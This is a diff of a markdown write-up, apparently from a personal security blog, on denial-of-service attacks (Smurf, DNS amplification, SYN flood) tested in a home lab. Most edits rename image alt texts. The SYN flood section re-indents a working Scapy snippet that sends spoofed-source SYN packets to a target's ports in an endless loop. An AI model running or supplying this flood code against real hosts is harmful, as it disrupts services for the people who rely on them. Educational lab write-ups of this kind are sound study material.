@@ -21,7 +21,7 @@ The below section is a basic refresher on ICMP and can be skipped.
 # ICMP
 Internet Control Message Protocol (ICMP) is a protocol used primarily to report errors (source quench, unreachable destination, etc.) in sending IP packets. An ICMP packet has the following packet format.
 
-![pwned](../../assets/images/icmp_format.png)
+![ICMP-Message-Format](../../assets/images/icmp_format.png)
 
 The two codes relevant to the Smurf attack are:
 
@@ -70,41 +70,41 @@ The above code takes a list of DNS resolvers and queries each one with a spoofed
 ## DNS Amplification Results
 The following image shows the IP address of the attacker (a Raspberry 3B+)
 
-![smurf-pi](../../assets/images/syn-flood/pi_ifconfig.png)
+![pi_ifconfig](../../assets/images/syn-flood/pi_ifconfig.png)
 
 and below we can see the target's (my laptop) IP address
-![smurf-pi](../../assets/images/syn-flood/laptop_ipconfig.png)
+![laptop_ipconfig](../../assets/images/syn-flood/laptop_ipconfig.png)
 
 We run the script in the following manner.
-![smurf-pi](../../assets/images/syn-flood/attack.png)
+![attack](../../assets/images/syn-flood/attack.png)
 
 Looking at the intercepted messages on my laptop, we can see that DNS replies are being received for
 queries never sent. We can see that the length of the DNS response is 124 bytes, which is much larger than the query the attacker has sent. 
-![smurf-pi](../../assets/images/syn-flood/wireshark-output.png)
+![wireshark-output](../../assets/images/syn-flood/wireshark-output.png)
 
 # SYN Flood
 Moving on to the TCP layer, one attack that can result in a DoS is the SYN flood attack, where an attacker sends a large number of SYNs to various ports of the target and not respond to them. This results in a large number of half-open connections, and before the connections can time out, another SYN is sent to reset the timer. This will eventually lead to a DoS. The following code shows the implementation in python.
 
 ```python
-  # Create the IP layer
-  ip = IP(src = source_ip, dst = g_target_ip)   # Note that the source_ip can be spoofed
+# Create the IP layer
+ip = IP(src = source_ip, dst = g_target_ip)   # Note that the source_ip can be spoofed
 
-	# Create the SYN packet
-	tcp = TCP(sport=RandShort(), dport=g_dest_ports, flags="S", seq=42)
+# Create the SYN packet
+tcp = TCP(sport=RandShort(), dport=g_dest_ports, flags="S", seq=42)
 
-	# Create the packet and continuously send it to all the specified ports
-	pkt = ip/tcp
-	while True:
-		send(pkt)
+# Create the packet and continuously send it to all the specified ports
+pkt = ip/tcp
+while True:
+  send(pkt)
 ```
 # SYN Flood Result
 The script is run in the following manner.
 
-![smurf-pi](../../assets/images/syn-flood/syn-flood-pi.png)
+![syn-flood-pi](../../assets/images/syn-flood/syn-flood-pi.png)
 
 The SYN packets can be seen below.
 
-![pwned](../../assets/images/smurf/syn-flood-wireshark.png)
+![syn-flood-wireshark](../../assets/images/smurf/syn-flood-wireshark.png)
 
 To specify more ports to send packets to, use the `-c` flag.
 
